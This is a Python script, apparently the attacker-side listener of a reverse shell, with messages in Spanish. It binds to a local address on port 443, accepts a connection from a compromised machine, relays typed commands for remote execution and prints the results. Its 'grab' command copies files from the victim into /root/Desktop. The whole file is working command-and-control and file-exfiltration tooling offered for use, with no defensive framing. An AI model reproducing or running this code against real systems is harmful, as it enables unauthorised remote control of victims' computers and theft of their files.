import os
import socket

def transfer(conn, command):
    conn.send(command.encode())
    grab, path = command.split("*")
    f = open('/root/Desktop/'+path, 'wb')
    while True:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print("[*] Transferencia completada")
            break
        if 'File not found'.encode() in bits:
            print("[-] Imposible encontrar el archivo")
            break
        f.write(bits)

def connect():
    s = socket.socket()
    s.bind(("192.168.1.133",443))
    s.listen(1)
    print('[*] Escuchando conexiones entrantes TCP en el puerto 443')
    conn , addr = s.accept()
    print('[*] Se obtuvo una conexion desde', addr)

    while True:
        command = input("Shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        elif 'grab' in command:
            transfer(conn, command)
        else:
            conn.send(command.encode())
            print(conn.recv(1024).decode())

def main():
    connect()
main()